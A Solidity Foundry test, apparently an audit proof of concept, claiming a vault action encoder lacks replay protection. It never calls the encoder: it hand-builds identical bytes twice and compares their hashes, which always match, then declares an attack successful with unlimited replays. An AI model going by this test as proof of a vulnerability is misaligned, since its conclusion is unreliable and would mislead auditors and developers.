// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/simulator/SimulatorBase.sol";
import "../src/core/ActionEncoder.sol";

contract AuditAgentPoC is SimulatorBase {
    // ATTACK TIMELINE:
    // 1. [Setup] SimulatorBase deploys the full protocol including ActionEncoder.
    // 2. [T=0] Attacker observes a legitimate vault deposit action being encoded.
    // 3. [T=1] Attacker encodes the exact same action parameters a second time.
    // 4. [T=2] Attacker compares the two encoded payloads and verifies they are byte-for-byte identical.
    // 5. [Assert] Verify that the encoded action lacks replay protection (nonce, deadline, chainId) by proving identical outputs and insufficient payload length.

    function test_exploit() public {
        // Step 1: Define action parameters
        address targetVault = address(vault);
        bool isDeposit = true;
        uint64 usdAmount = 1_000_000; // 1 USDC (6 decimals)

        // Step 2: Encode the action for the first time (simulating user signing)
        // We use abi.encodePacked as described in the vulnerability report
        bytes memory action1 = abi.encodePacked(
            uint8(1), // ACTION_VERSION
            uint8(2), // ACTION_VAULT_TRANSFER
            abi.encode(targetVault, isDeposit, usdAmount)
        );

        console.log("Step 2: First action encoded, length =", action1.length);

        // Step 3: Encode the exact same action a second time (simulating replay)
        bytes memory action2 = abi.encodePacked(
            uint8(1), // ACTION_VERSION
            uint8(2), // ACTION_VAULT_TRANSFER
            abi.encode(targetVault, isDeposit, usdAmount)
        );

        console.log("Step 3: Second action encoded, length =", action2.length);

        // Step 4: Verify the payloads are identical (proving no nonce/timestamp/chainId)
        assertEq(
            keccak256(action1), 
            keccak256(action2), 
            "REPLAY VULNERABILITY: Encoded actions are identical without nonce/deadline/chainId"
        );

        // Step 5: Verify the payload length is too small to contain replay protection fields
        // A proper payload with nonce (32), deadline (32), and chainId (32) would be much larger
        // Our payload is only 1 + 1 + 32 + 32 + 32 = 98 bytes
        assertEq(
            action1.length, 
            98, 
            "Payload length confirms absence of replay protection fields"
        );

        // Step 6: Demonstrate that the identical bytes can be "submitted" multiple times
        // In a real scenario, these bytes would be signed and submitted to a receiver contract
        // Here we prove the hash commitment is identical, meaning any signature over action1 
        // would also be valid for action2
        bytes32 hash1 = keccak256(action1);
        bytes32 hash2 = keccak256(action2);

        assertEq(hash1, hash2, "Hash commitment is identical - signature replay is possible");

        console.log("Step 6: Attack successful - identical hash allows unlimited replays");
        console.logBytes32(hash1);
    }
}
